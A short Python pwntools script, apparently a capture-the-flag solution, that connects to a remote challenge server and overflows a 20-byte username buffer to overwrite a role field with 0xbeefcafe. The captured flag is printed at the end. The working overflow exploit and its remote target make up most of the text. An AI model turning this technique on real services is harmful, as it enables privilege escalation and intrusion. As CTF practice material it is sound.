from pwn import *

#p = process('./chal')
p = remote('193.57.159.27', 31267)

## Eat the prompt
p.readline()
p.readuntil(b': ')

## The bug is in the fgets. You can read 30 bytes but 
### the username string in the Users structure is only 20 bytes
### overflow the username buffer with 20 bytes followed by the Role
### enumeration. If you give the 'god' value of 0xbeefcafe then
### the challenge outputs the flag.
name = b'a'*20
name += struct.pack('Q', 0xbeefcafe)

p.sendline(name)

flag = p.readline()
p.close()

print(flag)

'''
python3 exploit.py
[+] Opening connection to 193.57.159.27 on port 31267: Done
[*] Closed connection to 193.57.159.27 port 31267
b'ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}\n'
'''
